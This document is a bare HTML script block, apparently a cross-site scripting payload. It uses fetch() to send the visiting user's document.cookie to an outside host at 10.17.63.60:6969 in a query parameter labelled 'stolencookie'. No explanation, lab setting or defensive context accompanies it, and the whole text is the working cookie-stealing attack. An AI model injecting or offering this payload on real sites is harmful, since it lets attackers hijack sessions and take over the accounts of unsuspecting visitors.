<script>
  fetch("http://10.17.63.60:6969/?stolencookie=" + encodeURIComponent(document.cookie))
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
</script>
